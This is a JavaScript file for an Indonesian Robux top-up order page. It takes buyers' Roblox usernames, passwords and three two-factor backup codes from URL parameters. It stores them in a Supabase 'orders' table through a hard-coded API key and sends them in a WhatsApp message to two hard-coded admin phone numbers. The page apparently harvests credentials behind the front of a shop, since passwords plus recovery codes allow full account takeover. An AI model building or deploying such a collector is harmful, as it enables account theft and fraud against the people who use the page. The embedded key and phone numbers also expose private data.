const SUPABASE_URL = 'https://lstfzphfkdpzqqhbbuwi.supabase.co';
const SUPABASE_KEY = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6ImxzdGZ6cGhma2RwenFxaGJidXdpIiwicm9sZSI6ImFub24iLCJpYXQiOjE3NzgwNDk0MTYsImV4cCI6MjA5MzYyNTQxNn0.DqZ9AGsRrMHHYIPCtGQZAAhGM1TKYVsAugecvNyepQM';

const ADMIN_WA = {
  1: '6285883533298',
  2: '6285781071600'
};

let selectedAdmin = 1;
let orderData = {};

function formatRp(n) {
  return 'Rp ' + parseInt(n).toLocaleString('id-ID');
}

function ambilParams() {
  const params = new URLSearchParams(window.location.search);
  return {
    username: params.get('username') || '-',
    password: params.get('password') || '-',
    bc1: params.get('bc1') || '-',
    bc2: params.get('bc2') || '-',
    bc3: params.get('bc3') || '-',
    wa: params.get('wa') || '-',
    pkg_id: params.get('pkg_id'),
    pkg_nama: params.get('pkg_nama') || '-',
    pkg_robux: params.get('pkg_robux') || '-',
    pkg_harga: params.get('pkg_harga') || '0'
  };
}

function tampilkanRingkasan(data) {
  document.getElementById('sum-paket').textContent = data.pkg_nama;
  document.getElementById('sum-robux').textContent = data.pkg_robux + ' Robux';
  document.getElementById('sum-harga').textContent = formatRp(data.pkg_harga);
  document.getElementById('sum-username').textContent = data.username;
  document.getElementById('sum-password').textContent = data.password;
  document.getElementById('sum-bc1').textContent = data.bc1;
  document.getElementById('sum-bc2').textContent = data.bc2;
  document.getElementById('sum-bc3').textContent = data.bc3;
  document.getElementById('sum-wa').textContent = data.wa;
}

function pilihAdmin(num) {
  selectedAdmin = num;
  document.getElementById('admin-1').classList.remove('selected');
  document.getElementById('admin-2').classList.remove('selected');
  document.getElementById(`admin-${num}`).classList.add('selected');
}

async function simpanOrder(data) {
  await fetch(`${SUPABASE_URL}/rest/v1/orders`, {
    method: 'POST',
    headers: {
      'apikey': SUPABASE_KEY,
      'Authorization': `Bearer ${SUPABASE_KEY}`,
      'Content-Type': 'application/json',
      'Prefer': 'return=minimal'
    },
    body: JSON.stringify({
      username_roblox: data.username,
      password_roblox: data.password,
      backup_code_1: data.bc1,
      backup_code_2: data.bc2,
      backup_code_3: data.bc3,
      nomor_wa: data.wa,
      product_id: parseInt(data.pkg_id),
      nama_paket: data.pkg_nama,
      harga: parseInt(data.pkg_harga),
      status: 'pending'
    })
  });
}

async function bayarViaWA() {
  const errEl = document.getElementById('error-msg');

  try {
    await simpanOrder(orderData);
  } catch (e) {
    console.log('Gagal simpan order:', e);
  }

  const pesan = encodeURIComponent(
`Saya mau order Top Up Robux

Paket: ${orderData.pkg_nama}
Jumlah: ${orderData.pkg_robux} Robux
Harga: ${formatRp(orderData.pkg_harga)}

Username: ${orderData.username}
Password: ${orderData.password}
Backup Code 1: ${orderData.bc1}
Backup Code 2: ${orderData.bc2}
Backup Code 3: ${orderData.bc3}
No. WA saya: ${orderData.wa}

Mohon segera diproses. Terima kasih.`
  );

  window.open(`https://wa.me/${ADMIN_WA[selectedAdmin]}?text=${pesan}`, '_blank');
}

function init() {
  const data = ambilParams();

  if (!data.pkg_id) {
    window.location.href = 'index.html';
    return;
  }

  orderData = data;
  tampilkanRingkasan(data);
}

init();
